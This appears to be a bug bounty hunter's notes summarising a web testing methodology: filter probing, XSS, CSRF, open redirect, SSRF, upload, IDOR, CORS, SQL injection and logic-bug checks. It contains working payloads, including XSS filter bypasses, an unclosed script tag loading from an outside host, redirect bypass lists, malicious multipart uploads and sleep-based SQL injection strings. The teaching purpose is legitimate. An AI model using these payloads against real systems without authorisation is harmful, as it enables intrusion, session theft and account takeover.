#### Hackers question everything!
- Can you comment with basic HTML such as `<h2>`?
- Where is it reflected on the page?
- Can I input XSS in my name?
- Does it make any requests to an `/api/endpoint`, which may contain more interesting endpoints?
- Can I edit this post, maybe there’s IDOR ? And from there, deep down the rabbit hole you go.
If you have no developer experience at all then do not worry.
I recommend you check through https://github.com/swisskyrepo/PayloadsAllTheThings and try to get an understanding of the payloads provided.

#### Brute Force for common parameters that aren't found on the page.
`/comment.php?act=post&comment=Hey!&name=Void`
But the code also takes the `&img=` parameter which isn't referenced anywhere on the website

####  Look for filters in place and aim to bypass these.
This creates a starting-point for me and a 'lead' to chase.
Test functionality right in front of you to see if it's secure to the most basic bug types. You will be surprised at what interesting behavior you may find! If you don’t try, how will you know?

#### Since bug bounties are blackbox testing we literally have no idea how the server is processing the parameters, so why not try?

#### https://github.com/0xInfection/Awesome-WAF

#### XSS & filtering:
==Step One==: Testing different encoding and checking for any weird behaviour Finding out what payloads are allowed on the parameter we are testing and how thewebsite reflects/handles it.
Can I input the most basic `<h2>`,`<img>`,`<table>` without any filtering and it's reflected as HTML?
Are they filtering malicious HTML? If it's reflected as `&lt;` or `%3C` then I will test for double encoding `%253C` and `%26lt;` to see
how it handles those types of encoding.
Some interesting encodings to try can be found on  https://d3adend.org/xss/ghettoBypass
This step is about finding out what's allowed and isn't & how they handle our payload.
For example if `<script>` was reflected as `&lt;script&gt;`, but `%26lt;script%26gt;` was reflected as `<script>`, then I know I am onto a bypass and I can begin to understand how they are handling encodings (which will help me in later bugs maybe!).
If not matter what you try you always see `&lt;script&gt;` or `%3Cscript%3E` then the parameter in question may not be vulnerable.

==Step Two==: Reverse engineering the developers' thoughts (this gets easier with time & experience)
if I notice they are filtering `<script>`,`<iframe>` aswell as `“onerror=”`, but notice they **aren’t** filtering `<script` then we know it's game on and time to get creative.
Are they only looking for complete valid HTML tags? If so we can bypass with `<script src=//mysite.com?c=`
If we don't end the script tag the HTML is instead appended as a parameter value.
How does this website in question handle encodings? `<%00iframe`, `on%0derror`. 

Testing for ==XSS== flow:
- How are “non-malicious” HTML tags such as `<h2>` handled?
- What about incomplete tags? `<iframe src=//zseano.com/c=`
- How do they handle encodings such as `<%00h2?` (There are LOTS to try here, `%0d`, `%0a`, `%09` etc)
- Is it just a blacklist of hardcoded strings? Does `</script/x>` work? `<ScRipt>` etc.
A great resource I highly recommend you check out is:
https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet

#### Cross Site Request Forgery (CSRF)
forcing the user to do a specific action on the target website from your website,
usually via an HTML form `<form action=”/login” method=”POST”>` and is rather straightforward to find.
An example:  forcing the user to change their account email to one controlled by you.

* look for areas on the website which should contain protection around them, such as *updating your account information*.

What behavior do you see when sending a blank CSRF value, did it reveal any framework information from an error?
Did it reflect your changes but with a CSRF error?
Have you seen this parameter name used on other websites?

As well as this sometimes they'll only check if their domain is found in the referer, so creating a directory on your site & visiting https://www.yoursite.com/https://www.theirsite.com/ may bypass the checks.
Or what about https://www.theirsite.computer/ ? Again, to begin with I am focused purely on finding areas that should contain CSRF protection (sensitive areas!), and then checking if they have created custom filtering.
*Where there’s a filter there is usually a bypass!*
**typically all sensitive features should be protected from CSRF, so find them and test there.**

#### Open url redirects
 if the target has some type of *Oauth* flow which handles a token along with a redirect.
payloads I use to bypass filters but more importantly used to determine how their filter is working.
```http
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
//yoururl.com
//theirsite@yoursite.com
/\/yoursite.com
https://yoursite.com%3F.theirsite.com/
https://yoursite.com%2523.theirsite.com/
https://yoursite?c=.theirsite.com/ (use # \ also)
//%2F/yoursite.com
////yoursite.com
https://theirsite.computer/
https://theirsite.com.mysite.com
/%0D/yoursite.com (Also try %09, %00, %0a, %07)
/%2F/yoururl.com
/%5Cyoururl.com
//google%E3%80%82com
```
Some common words I dork for on google to find vulnerable endpoints: (don't forget to test for upper & lower case!)
```http
return, return_url, rUrl, cancelUrl, url, redirect, follow, goto, returnTo, returnUrl, r_url, history, goback, redirectTo, redirectUrl, redirUrl
```

One common problem people run into is **not encoding the values correctly**, especially if the target only allows for /localRedirects.
Your payload would look like something like `/redirect?goto=https://google.com/`, but when using this as it is the `?goto=` parameter may get dropped in redirects (depending on how the web application works and how many redirects occur!).
This also may be the case if it contains multiple parameters (via &) and the redirect parameter may be missed.
I will always encode certain values such as `# & / \ ?`to force the browser to decode it after the first redirect.
Location: 
```http
/redirect{{%3F}}}goto=https://google.com/{{{%253F}}}example=hax
```
We end up with:
```http
https://www.example.com/redirect?goto=https://www.zseano.com/%3Fexample=hax
```
which then when it redirects again will allow the ?example parameter to also be sent.
Sometimes you will need to double encode them based on how many redirects are made & parameters.
When hunting for open url redirects also bear in mind that they can be used for chaining an SSRF vulnerability which is explained more below.

If the redirect you discover is via the *Location:* header then *XSS* will *not* be possible, however if it redirected via something like *window.location* then you should test for *javascript:* instead of redirecting to your website as XSS will be possible here.

*Some common ways to bypass filters:*
```http
java%0d%0ascript%0d%0a:alert(0)
j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
java%07script:prompt`0`
java%09scrip%07t:prompt`0`
jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
pjavascriptt:confirm`0`
```

#### Server Side Request Forgery (SSRF)
When hunting for SSRF I specifically look for features which already `take an URL parameter`. *Why?*
Because I am looking for specific areas of a website where a developer may have created a filter to prevent malicious activity.

on large bug bounty programs I will instantly try to find their API console (if one is available, usually found
on their developer docs page). This area usually contains features which already take a URL parameter and execute code. 
**When testing for SSRF you should always test how they handle redirects.**

#### File uploads for stored XSS & remote code execution
Developers create filters and  if it's on their main domain then the very first thing I will try to upload is a `.txt`, `.svg` and `.xml`.
test for `.txt` to check how strict the filter actually is (if it says only images `.jpg` `.png` `.gif` are allowed for example) and then move on from there.
As well as this just simply uploading three different image types (`.png` `.gif` `.jpg`) can give you an indication as to how they are handling uploads.
All photos saved in the same format regardless of the photo type we uploaded?
Are they not trusting any of our input and always saving as `.jpg` regardless?

**For example**, what happens if you name the file `zseano.php/.jpg` - the code may see `.jpg` and think “ok” but the server actually
writes it to the server as `zseano.php` and misses everything after the forward slash.
I've also had success with the payload `zseano.html%0d%0a.jpg`. (`%0d%0a` are newline characters).

(some developers may think users can’t save files with <> “ characters in them.
```http
------WebKitFormBoundarySrtFN30pCNmqmNz2
Content-Disposition: form-data; name="file"; filename="58832_300x300.jpg<svg onload=confirm()>"
Content-Type: image/jpeg
ÿØÿà
```
What is the developer checking for exactly and how are they handling it?
Are they trusting any of our input?

**For example** if I provide it with:
```http
------WebKitFormBoundaryAxbOlwnrQnLjU1j9
Content-Disposition: form-data; name="imageupload"; filename="zseano.jpg"
Content-Type: text/html
```
Does the code see `.jpg` and think “Image extension, must be ok!” but trust my *content-type* and reflect it as *Content-Type:text/html*?
Or does it set *content-type* based on the file extension?
What happens if you provide it *with NO file extension* (or *NO file name*!), will it default to the content-type or file extension?
```http
------WebKitFormBoundaryAxbOlwnrQnLjU1j9
Content-Disposition: form-data; name="imageupload"; filename="zseano."
Content-Type: text/html

------WebKitFormBoundaryAxbOlwnrQnLjU1j9
Content-Disposition: form-data; name="imageupload"; filename=".html"
Content-Type: image/png
<html>HTML code!</html>
```
Perhaps they aren’t even doing checks on the file extension and they are instead doing checks on the `imagesize`.
Sometimes if you leave the image header this is enough to bypass the checks.
```http
------WebKitFormBoundaryoMZOWnpiPkiDc0yV
Content-Disposition: form-data; name="oauth_application[logo_image_file]"; filename="testing1.html"
Content-Type: text/html
‰PNG
<script>alert(0)</script>
```

#### Insecure Direct Object Reference (IDOR)
**GUID (2b7498e3-9634-4667-b9ce-a8e81428641e)**
Brute forcing GUIDs is usually a dead-end so at this stage I will `check for any leaks of this value`.
I once had a bug where I could remove anyone's photo but I could not enumerate the GUID values. Visiting a users’ public profile and viewing the source revealed that the users photo GUID was saved with the file name
`https://www.example.com/images/users/2b7498e3-9634-4667-b9ce-a8e81428641e/photo.png`.
**even if you see some type of encrypted value, ==just try an integer!== The server may process it the same.**

 Also try simply injecting ID parameters.
 Anytime you see a request and the postdata is JSON
 ```json
 {"example":"example"}
 ```
try simply injecting a new parameter name
```json
{"example":"example","id":"1"}
```
This not only applies to JSON requests but all requests, but I typically have a higher success rate when it's a JSON payload. **look for PUT requests!**.

#### Cross-Origin Resource Sharing (CORS)
when you see `Access-Control-Allow-Origin:` as a ==header== on the response. You will also sometimes need `Access-Allow-Credentials:true` depending on the scenario.
>These headers allow for an external website to read the contents of the website. 
 `Access-Allow-Credentials` will be needed if session cookies are required on the request.

 When hunting for CORS misconfigurations you can simply add `Origin: theirdomain.com` onto every request you are making and then Grep for `Access-Control-Allow-Origin`. 
Even if you discover a certain endpoint which does contain this header but it doesn't contain any sensitive information, spend time trying to bypass it.
Remember *developers reuse code* and this “harmless” bypass may be useful somewhere later down the line in your research.

#### SQL Injection
note is typically **legacy code** is more vulnerable to SQL injection.
Go in with a `sleep` payload as usually these payloads will slip through any filtering.
```sql
' or sleep(15) and 1=1#
' or sleep(15)#
' union select sleep(15),null#
```

#### Business/Application Logic
understanding how a website `should work` and then trying various techniques to create weird behaviour can lead to some interesting finds.
Just simply checking if the process works how it should work.
One common area I look for when hunting for application logic bugs is *new features* which ==interact== with *old features*. 

Spend days/weeks understanding how the website should work and *what the developers were expecting the user to input/do* and then coming up with ways to break & bypass this.

>Another great example of a simple business logic bug is being able to sign up for an account with the email `example@target.com`. Sometimes these accounts have special privileges such as no rate limiting and bypassing certain verifications.

#### Choosing a program
choose **wide scope** and **well known names**, it doesn't matter if it's private or public.
From experience I know that the bigger a company the more teams they'll have for different jobs which equals to a **higher chance of mistakes being made**.
If you are still waiting for a response +3 months after reporting then consider if it’s worth spending more time on this
program. More than likely no.

#### Writing notes as you hack :)
Writing notes as you hack can actually help save you from burn out in the future as when you are feeling like you’ve gone through all available features you can refer back to your notes to revisit interesting endpoints and try a new approach with a fresh mindset.
Sometimes I will be testing a certain feature / endpoint that I just simply can’t exploit, so I will note it down along with what I've tried and what I believe it is vulnerable to & I will come back to it. Never burn yourself out.
Let’s imagine we are testing `example.com` and we’ve discovered `/admin` `/admin-new` and `/server_health`, along with the parameters `debug` and `isTrue`. We can create `examplecom-endpoints.txt` & `params.txt` so we know these endpoints work on the specific domain, and from there you can test ALL `endpoints/parameters` across multiple domains and create a `global-endpoints.txt` and begin create commonly found endpoints. Over time you will end up with lots of `endpoints/parameters` for specific domains and you will begin to map out a web application much easier.

#### Has anyone else found anything and disclosed a writeup?

#### Before even hacking I will search Google, HackerOne disclosed and OpenBugBounty for any issues found in the past as I want to know if any valid issues have been found and if any interesting bypasses were used.

#### When testing a feature such as the register & login process I have a constant flow of questions going through my head, for example, can I login with my social media account? Is it the same on the mobile application? If I try another geolocation can I login with more options, such as WeChat (usually for china users). What characters aren't allowed? I let my thoughts naturally go down the rabbit hole because that's what makes you a natural hacker.

### Registration Process
**What's required to sign up? 
If there's a lot of information (Name, location,bio, etc), where is this then reflected after signup?**

>> Can I register with my social media account? If yes, is this implemented via some type of Oauth flow which contains tokens which I may be able to leak? What social media accounts are allowed? What information do they trust from my social media profile? I once discovered stored XSS via importing my facebook album conveniently named `<script>alert(0)</script>`.

>>What characters are allowed? Is `<> “ '` allowed in my name? (at this stage, enter the XSS process testing. `<script>`Test may not work but `<script` does.) What about unicode, `%00`, `%0d`. How will it react to me providing `myemail%00@email.com`? It may read it as `myemail@email.com`. Is it the same when signing up with their mobile app?

>> Can I sign up using `@target.com` or is it blacklisted? If yes to being blacklisted, question why? Perhaps it has special privileges/features after signing up? Can you bypass this? Always sign up using your targets email address.

>> What happens if I revisit the register page after signing up? Does it redirect, and can I control this with a parameter? *Most likely yes!* What happens if I re-sign up as an authenticated user? Think about it from a developers’ perspective: *they want the user to have a good experience so revisiting the register page when authenticated should redirect you*. Enter the need for parameters to control where to redirect the user!

>> what do the `.js` files do on this page? Perhaps the login page has a specific *login.js* file which contains more URLs. This also may give you an indication that the site relies on a `.js` file for each feature!
>> I have a video on hunting in `.js` files on YouTube which you can find here:
>> Let’s be a dork and read `.js` files (https://www.youtube.com/watch?v=0jM8dDVifaI)

>> What happens if I try login with `myemail%00@email.com`?
>> does it recognise it as `myemail@email.com` and maybe log me in? If yes, try signup with `my%00email@email.com` and try for an account takeover.
>> Think about the same when claiming a username too.

**Can I login with my social media account `?`**
	If yes `?`
		Is this implemented via some type of Oauth flow(which contains tokens which I may be able to leak) `?`
		What social media accounts are allowed `?`
		Is it the same for all countries `?`

**Updating account information**
Is there any CSRF protection when updating your profile information `?` (There should be, so expect it. Remember, we’re expecting this site to be secure and we
want to challenge ourselves on bypassing their protection).
	If yes`?`
		How is this validated `?`
		What happens if I send a blank CSRF token, or a token with the same length `?`

**Any second confirmation for changing your email/password?**
	If no `?`
		Then you can chain this with XSS for account takeover. Typically by itself it isn’t an issue, but if the program wants to see impact from XSS then this is something to consider.

**How do they handle basic `< > “ '` characters and where are they reflected?**
	What about unicode? `%09` `%07` `%0d%0a`.

**What information is actually available on my public profile that I can control?**
The key is what you can control and how and where it’s reflected.
What's in place to prevent me from entering malicious HTML in my bio for example?
Perhaps they’ve used *htmlentities* so `< > “` is filtered, and it’s reflected as:
```html
<div id=”example” onclick=”runjs(‘userinput&lt;&quot;’);”>
```
But you could use `‘);alert(‘example’);` which results in:
```html
<div id=”example” onclick=”runjs(‘userinput’);alert(‘example’);”>
```

#### Developer tools
- What tools are available for developers? Can I test a webhook event for
example? Just google for SSRF webhook and you’ll see.

- What are the **oldest features**? Research the company and look for features they were excited to release but ultimately did not work out. Perhaps from dorking around you can find old files linked to this feature which may give you a window. Old code = bugs

- What **new features** do they plan on releasing? Can I find any reference to it already on their site? Follow them on twitter & signup to their newsletters. Stay up to date with what the company is working on so you can get a head start at not only testing this feature when it’s released, but looking for it before it’s even released.

#### Payment features
- What features are available if I upgrade my account? Can I access them *without paying*`?`.

You can find test numbers from sites such as:
http://support.worldpay.com/support/kb/bg/testandgolive/tgl5103.html
https://www.paypalobjects.com/en_GB/vhelp/paypalmanager_help/credit_card_numbers.htm

**Some common keywords I dork for when hunting for domains with functionality:**
`login, register, upload, contact, feedback, join, signup, profile, user, comment, api, developer, affiliate, careers, upload, mobile, upgrade, passwordreset.`

One common issue researchers overlook when dorking is duplicated results from
google. If you scroll to the last page of your search & click 'repeat the search with the
omitted results included.' then more results will appear. As you are dorking you can
use “-keyword” to remove certain endpoints you're not interested in. Don't forget to
also check the results with a mobile user-agent as the Google results on a mobile
are different to desktop.

**Don’t blindly use wordlists on your targets and actually use meaningful wordlists to yield better results.**

After dorking, my subdomain scan results are usually complete so I will use XAMPP to quickly scan the `/robots.txt` of each domain.
Why *robots.txt*? Because Robots.txt contains a list of endpoints the website owner does & does NOT want indexed by google.

**creating a custom wordlist as you hunt can help you find more endpoints to test for.**
Spend time learning how wordlists are built as custom wordlists are vital to your research when wanting to discover more.

>Lots of endpoints, lots of common parameters = bugs! 
>Don’t forget to test `GET.POST`! I have had cases where it wasn’t vulnerable in a `GET` request but it was in a `POST. $_GET` vs `$_POST`

Remember my intentions are to `spend as much time as possible` on this website learning everything possible. The more you look, the more you learn. You can never find anything on your first look, trust me. You will miss stuff.

I spent weeks on each endpoint understanding what each `.js` file did and I soon quickly built a script to check **daily** for any changes in these `.js`

At this point I would have spent months and months on the same program and should have a complete mental mind map about the target including all of my notes I wrote along the way. This will include all interesting functionality available, interesting subdomains, vulnerable parameters, bypasses used, bugs found. *Over time this creates a complete understanding of their security as well as a starting point for me to jump into their program as I please*. Welcome to the “bughunter” lifestyle.
This does not happen in days, so please be patient with the process.

The last step is simply `rinse & repeat`. Keep a mental note of the fact developers are continuing to push **new code daily** and **the same mistakes made 10 years ago are still being made today**. Keep running tools to check for new changes, continue to play with interesting endpoints you listed in your notes, keep dorking, test new features as they come out, but most importantly you can now start applying this methodology on another program. 

Scanning for subdomains, files, directories & leaks You should look to automate the entire process of scanning for subdomains, files, directories and even leaks on sites such as GitHub. Hunting for these manually is time consuming and your time is better spent hands on hacking. You can use a service such as `CertSpotter` by SSLMate to keep up to date with new HTTPS certificates a company is creating and @NahamSec released `LazyRecon` to help automate your recon: https://github.com/nahamsec/lazyrecon.

>Don’t forget to also include `.js` files in those daily scans as they typically contain new code first before the feature goes live. At which point you can then think, “well, the code is here, but I don’t see the feature enabled”, and then you’ve started a new line of questioning that you may not have thought of, can you enable this feature somehow? (true/false?!)

>>**time and hard work is required. I never claim to be the best hacker and I never claim to know everything, you simply can’t. This methodology is simply a “flow” I follow when approaching a website, questions I ask myself, areas I am looking for etc. Take this information and use it to aid you in your research and to mold your own methodology around.**
___
